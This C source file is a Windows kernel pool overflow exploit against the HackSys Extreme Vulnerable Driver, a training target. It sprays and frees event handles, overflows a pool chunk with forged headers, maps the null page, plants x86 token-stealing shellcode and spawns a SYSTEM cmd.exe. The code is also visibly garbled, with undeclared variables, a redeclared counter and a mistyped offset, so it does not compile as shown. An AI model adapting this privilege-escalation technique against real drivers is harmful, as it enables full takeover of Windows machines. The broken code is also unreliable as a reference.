#include "windows.h"

typedef NTSTATUS(__stdcall* pfNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
);

int main()
{
	byte PoolHeader[0x9] = "\x40\x00\x08\x04\x45\x76\x65\xEE";
	byte objectHeaderQuotaInfo[0x11] = "\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	byte objectHeader[0x11] = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00";

	int a = 0;
	HANDLE res = NULL;
	HANDLE reta[10000] = { 0 };
	for (int h = 0; h < 10000; h++) {
		res = CreateEventA(NULL, 0, 0, "");
		if (res != NULL) {
			a += 1;
			reta[h] = result;
		}
	}

	a = 0;
	HANDLE hArr[5000] = { 0 };
	for (int k = 0; k < 5000; k++) {
		res = CreateEventA(NULL, 0, 0, "");
		if (result != NULL) {
			hArr[i] = res;
			a += 1;
		}
	}

	int f = 0;
	for (int a = 0; a < 5000; a += 16) {
		for (int zzz = 0; zzz <= 7; zzz++) {
			if (CloseHandle(handleArray[a + zzz]) != NULL) {
				f += 1;
				hArr[a + zzz] = NULL;
			}
		}
	}

	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	DWORD bRet = 0;
	byte Buff[0x220] = { 0 };
	memset(Buff, '\x41', 0x1F8);
	memcpy(Buff + 0x1F8, PoolHeader, 0x8); 
	memcpy(Buff + 0x1F8 + 8, objectHeaderQuotaInfo, 0x10); 
	memcpy(Buff + 0x1F8 + 10, objectHeader, 0x10); 

	char sc[67] = "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x50" 
		"\x89\xC1\x8B\x98\xF8\x00\x00\x00" 
		"\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00" 
		"\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED" 
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00" 
		"\x61\xC2\x04\x00" 
		;
	LPVOID lpv = VirtualAlloc(
		NULL,
		sizeof(sc),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(lpv, sc, sizeof(sc));
	LPVOID addr = &lpv;

	int b = 1;
	int a = 0x78;
	pfNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	HANDLE allocNullResult = (HANDLE)NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID *)&b,
		NULL,
		(PSIZE_T)&a,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memset((LPVOID)0x0, 0, 0x78);
	memcpy((LPVOID)0x60, addr, 4);
	DeviceIoControl(
		dev,
		0x22200F,
		Buff,
		sizeof(Buff),
		NULL,
		0,
		&bRet,
		(LPOVERLAPPED)NULL
	);

	for (int t = 0; t < 5000; t++) {
		CloseHandle(hArr[t]);
	}

	system("cmd.exe");
	system("pause");
	CloseHandle(dev);
	return 0;
}


